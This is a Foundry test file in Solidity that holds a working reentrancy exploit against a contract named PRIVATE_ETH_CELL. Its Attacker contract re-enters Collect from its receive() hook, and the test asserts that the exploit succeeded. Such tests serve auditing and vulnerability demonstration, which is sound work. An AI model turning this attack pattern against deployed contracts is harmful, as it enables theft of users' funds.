
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL} from "../src/PRIVATE_ETH_CELL.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {
    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);
        vm.assume(attackVal <= address(this).balance / 2);

        uint256 depositAmount = attackVal * 2;
        vm.deal(address(_contractUnderTest), depositAmount);
        vm.deal(address(_attacker), depositAmount);
        vm.deal(address(this), depositAmount);

        _attacker.setupAttack{value: depositAmount}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PRIVATE_ETH_CELL(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        _victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount == 1) {
                _victim.Collect(storedAttackVal);
            }
        }
    }
}
